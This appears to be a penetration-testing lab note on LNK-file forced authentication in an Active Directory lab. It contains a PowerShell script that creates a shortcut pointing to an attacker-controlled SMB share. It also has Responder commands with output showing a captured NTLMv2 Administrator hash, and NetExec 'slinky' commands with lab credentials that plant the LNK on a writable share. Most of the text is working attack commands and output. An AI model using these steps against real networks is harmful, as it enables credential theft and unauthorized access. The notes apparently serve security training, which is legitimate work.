
maybe trying to elevate and get an admin hash maybe trying to

the script
```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\<ATTACK-IP>\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

when making this you need to be in an elevated PowerShell, when saving the file use `@`, `~` characters to make it as high as possible. then put the LNK in the file share

once the file is saved run responder and then click on said share

```
sudo python Responder.py -I eth0 -dPv
```



## Lab

```
kali@kali ~/Responder (master)> sudo python Responder.py -I eth0 -dPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.176.128]
    Responder IPv6             [fe80::8c0a:45e8:a0db:320d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-IFAPGQNMBYX]
    Responder Domain Name      [NVST.LOCAL]
    Responder DCE-RPC Port     [48131]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.176.254, now waiting for incoming requests...
[SMB] NTLMv2-SSP Client   : 192.168.176.129
[SMB] NTLMv2-SSP Username : MARVEL\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::MARVEL:861d9359868d4361:E198DA39E2FA572D9E023652ECFB5E28:01010000000000008041F71AF587DA016B90D2680F22402D00000000020008004E0056005300540001001E00570049004E002D004900460041005000470051004E004D0042005900580004003400570049004E002D004900460041005000470051004E004D004200590058002E004E005600530054002E004C004F00430041004C00030014004E005600530054002E004C004F00430041004C00050014004E005600530054002E004C004F00430041004C00070008008041F71AF587DA01060004000200000008003000300000000000000000000000003000000F222B219CB3CA66BD20BA11963D0DC8357B3411F222BD8FB2BCF25B97E78E640A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100370036002E003100320038000000000000000000

```



# Using NXC

using NXC really makes life easier, you get to script the entire process of creating the LNK file on the machine

```
nxc smb <VICTIM_IP> -u <user> -p '<Password>' -M slinky -o NAME=<LINK_NAME> SERVER=<Attacker_IP>
nxc smb 192.168.176.129 -u fcastle -p 'Password1' -M slinky -o NAME=tryharder SERVER=192.168.176.128
```

```
kali@kali ~> nxc smb 192.168.176.129 -u fcastle -p 'Password1' -M slinky -o NAME=tryharder SERVER=192.168.176.128
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.176.129 445    HYDRA-DC         [*] Enumerated shares
SMB         192.168.176.129 445    HYDRA-DC         Share           Permissions     Remark
SMB         192.168.176.129 445    HYDRA-DC         -----           -----------     ------
SMB         192.168.176.129 445    HYDRA-DC         ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.176.129 445    HYDRA-DC         C$              READ,WRITE      Default share
SMB         192.168.176.129 445    HYDRA-DC         Hackme          READ,WRITE
SMB         192.168.176.129 445    HYDRA-DC         IPC$            READ            Remote IPC
SMB         192.168.176.129 445    HYDRA-DC         NETLOGON        READ,WRITE      Logon server share
SMB         192.168.176.129 445    HYDRA-DC         SYSVOL          READ            Logon server share
SLINKY      192.168.176.129 445    HYDRA-DC         [+] Found writable share: Hackme
SLINKY      192.168.176.129 445    HYDRA-DC         [+] Created LNK file on the Hackme share

```




### Extra:

interesting?
https://github.com/Plazmaz/LNKUp




### References

https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf